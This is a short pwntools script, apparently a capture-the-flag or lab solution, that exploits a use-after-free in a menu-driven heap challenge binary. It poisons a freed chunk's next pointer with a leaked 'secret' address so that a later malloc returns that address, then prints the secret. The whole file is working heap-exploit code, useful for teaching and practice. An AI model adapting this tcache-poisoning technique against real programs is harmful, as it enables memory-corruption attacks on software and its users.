from pwn import *
import sys

proc = process(sys.argv[1])
proc.recvuntil(b"secret stored at ")
secret = int(proc.recvline()[:-2], 16)

proc.sendline(b"malloc")
proc.sendline(b"0")
proc.sendline(b"100")
proc.sendline(b"malloc")
proc.sendline(b"1")
proc.sendline(b"100")

proc.sendline(b"free")
proc.sendline(b"1")
proc.sendline(b"free")
proc.sendline(b"0")

# overwriting first entry (*next) of freed space to point to data we want 
proc.sendline(b"scanf")
proc.sendline(b"0")
proc.sendline(p64(secret))

proc.sendline(b"malloc")
proc.sendline(b"1")
proc.sendline(b"100")
proc.sendline(b"malloc")
proc.sendline(b"0")
proc.sendline(b"100")

proc.sendline(b"puts")
proc.sendline(b"0")
proc.interactive()
